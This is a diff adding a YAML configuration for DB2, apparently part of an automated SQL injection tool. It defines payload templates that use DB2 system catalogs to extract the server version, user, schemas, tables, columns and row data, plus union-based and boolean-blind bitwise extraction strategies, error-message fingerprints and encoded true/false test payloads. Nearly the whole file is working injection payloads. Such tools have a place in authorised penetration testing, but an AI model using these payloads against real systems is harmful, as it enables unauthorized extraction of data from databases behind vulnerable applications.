@@ -1,0 +1,153 @@
+vendor: ""
+resource: 
+ info: |
+  select 
+      versionnumber
+      || '${ENCLOSE_VALUE_SQL}'
+      || current server
+      || '${ENCLOSE_VALUE_SQL}'
+      || user
+      || '${TRAIL_SQL}'
+  from sysibm.sysversions
+ schema: 
+  database: |
+   select varchar(
+       LISTAGG(
+           '${ENCLOSE_VALUE_SQL}'
+           || trim(schemaname)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+       )
+       || '${TRAIL_SQL}'
+   )
+   from syscat.schemata
+   {limit}
+  table: |
+   select varchar(
+       LISTAGG(
+           '${ENCLOSE_VALUE_SQL}'
+           || trim(name)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+       )
+       || '${TRAIL_SQL}'
+   )
+   from sysibm.systables 
+   where creator = '${DATABASE}'
+   {limit}
+  column: |
+   select varchar(
+       LISTAGG(
+           '${ENCLOSE_VALUE_SQL}'
+           || trim(name)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+       )
+       || '${TRAIL_SQL}'
+   )
+   from sysibm.syscolumns
+   where coltype != 'BLOB'
+   and tbcreator = '${DATABASE}'
+   and tbname = '${TABLE}'
+   {limit}
+  row: 
+   query: |
+    /**
+     * LISTAGG limit is 4000 and aggregate all data before limit is applied
+     * => subquery
+     */
+    select varchar(
+        LISTAGG(
+            '${ENCLOSE_VALUE_SQL}'
+            || s
+            || '${SEPARATOR_QTE_SQL}1${ENCLOSE_VALUE_SQL}'
+        )
+        || '${TRAIL_SQL}'
+    )
+    from (
+        select ${FIELDS} s
+        from ${DATABASE}.${TABLE}
+        {limit}
+    )
+   fields: 
+    field: |
+     trim(
+         coalesce(
+             varchar(
+                 ${FIELD} 
+                 || ''
+             ), 
+             ''
+         )
+     )
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   (
+       select
+           varchar(
+               replace(
+                   '${LEAD}'
+                   || substr (
+                       (${INJECTION}),
+                       ${INDEX}
+                   ),
+                   '${LEAD}${TRAIL_SQL}',
+                   '${LEAD}'
+               )
+           )
+       from sysibm.sysdummy1
+   )
+  limit: "limit ${LIMIT}, 5"
+  failsafe: "varchar('' || (1337${INDICE}7330%2b1), 1024)"
+  calibrator: |
+   rpad(
+       '${CALIBRATOR_SQL}', 
+       1024, 
+       '${CALIBRATOR_SQL}'
+   )
+  limitBoundary: 0
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "function.db2"
+    - "DB2 SQL Error"
+    - "Warning: db2_execute()"
+    - "Warning: db2_fetch_array()"
+ normal: 
+  indices: "union select ${INDICES} from sysibm.sysdummy1"
+  capacity: |
+   /**
+    * repeat gets internal table size error on blind 'where 1=1'
+    * => uses rpad instead
+    */
+   varchar('${LEAD}${INDICE}' || ${CALIBRATOR}, 1024)
+  orderBy: "order by 1337"
+ boolean: 
+  test: 
+   falses: 
+    - "1 = 0"
+    - "'a' %21= 'a'"
+    - "'b' %21= 'b'"
+    - "1 = 2"
+    - "1 %21= 1"
+    - "2 %21= 2"
+   trues: 
+    - "0 = 0"
+    - "'a' %21= 'b'"
+    - "'a' = 'a'"
+    - "1 = 1"
+    - "2 = 2"
+    - "1 %21= 2"
+   initialization: "0%2b1 = 1"
+   bit: |
+    0 != BITAND(
+        ascii(
+            substr(
+                ${INJECTION}, 
+                ${INDEX}, 
+                1
+            )
+        ), 
+        ${BIT}
+    )
+   length: "length(${INJECTION}) > ${INDEX}"
+  blind: "and ${TEST}"
